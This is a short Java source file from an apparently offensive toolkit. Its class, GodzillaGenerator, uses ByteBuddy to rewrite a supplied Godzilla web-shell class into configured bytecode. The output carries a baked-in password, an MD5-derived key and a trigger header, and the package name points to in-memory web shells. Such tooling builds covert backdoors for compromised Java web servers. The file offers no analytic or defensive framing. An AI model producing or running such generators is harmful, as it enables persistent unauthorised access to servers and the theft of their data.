package com.reajason.javaweb.memsell;

import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FieldAccessor;
import net.bytebuddy.implementation.Implementation;
import net.bytebuddy.implementation.SuperMethodCall;
import net.bytebuddy.matcher.ElementMatchers;
import org.apache.commons.codec.digest.DigestUtils;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator {

    public byte[] generate(Class<?> godzillaClass, String godzillaClassName,
                           String pass, String key,
                           String headerName, String headerValue) {
        String md5Key = DigestUtils.md5Hex(key).substring(0, 16);
        String md5 = DigestUtils.md5Hex(pass + md5Key).toUpperCase();
        Implementation.Composable fieldSets = SuperMethodCall.INSTANCE
                .andThen(FieldAccessor.ofField("pass").setsValue(pass))
                .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
                .andThen(FieldAccessor.ofField("md5").setsValue(md5))
                .andThen(FieldAccessor.ofField("headerName").setsValue(headerName))
                .andThen(FieldAccessor.ofField("headerValue").setsValue(headerValue));
        try (DynamicType.Unloaded<?> make = new ByteBuddy()
                .redefine(godzillaClass)
                .name(godzillaClassName)
                .constructor(ElementMatchers.any())
                .intercept(fieldSets)
                .make()) {
            return make.getBytes();
        }
    }
}
